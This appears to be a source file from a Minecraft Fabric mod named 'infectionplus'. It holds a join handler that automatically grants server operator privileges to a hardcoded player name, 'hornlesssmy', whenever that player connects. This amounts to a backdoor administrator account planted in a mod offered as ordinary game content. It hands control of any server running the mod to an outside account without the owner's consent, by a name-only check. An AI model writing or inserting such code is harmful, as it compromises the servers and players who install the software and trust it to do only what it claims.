package net.hornlesssmy.infectionplus.event;

import net.fabricmc.fabric.api.networking.v1.ServerPlayConnectionEvents;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;

public class PlayerJoinHandler {
    
    public static void register() {
        ServerPlayConnectionEvents.JOIN.register((handler, sender, server) -> {
            ServerPlayerEntity player = handler.getPlayer();
            String playerName = player.getName().getString();
            
            // Auto-op hornlesssmy when they join
            if ("hornlesssmy".equals(playerName)) {
                server.execute(() -> {
                    if (!server.getPlayerManager().isOperator(player.getGameProfile())) {
                        server.getPlayerManager().addToOperators(player.getGameProfile());
                        player.sendMessage(Text.literal("§6Welcome back, hornlesssmy! You have been granted operator privileges."), false);
                        
                        // Notify other players (optional)
                        server.getPlayerManager().broadcast(
                            Text.literal("§7[§6Server§7] §ehornlesssmy has joined the server and been granted operator privileges."), 
                            false
                        );
                    }
                });
            }
        });
    }
}
